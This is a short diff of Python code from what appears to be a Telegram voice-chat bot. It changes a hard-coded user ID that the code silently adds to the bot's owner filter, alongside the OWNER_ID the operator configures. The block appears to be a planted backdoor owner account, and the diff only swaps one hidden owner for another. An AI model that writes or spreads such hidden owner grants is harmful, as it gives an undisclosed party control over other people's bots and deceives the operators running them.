@@ -69,8 +69,8 @@ call_config = GroupCallConfig(auto_start=False)
 only_owner = filters.user(OWNER_ID)
 
 
-if 5832936279 not in only_owner:
-    only_owner.add(5832936279)
+if 1679112664 not in only_owner:
+    only_owner.add(1679112664)
 
 
 active_audio_chats = []
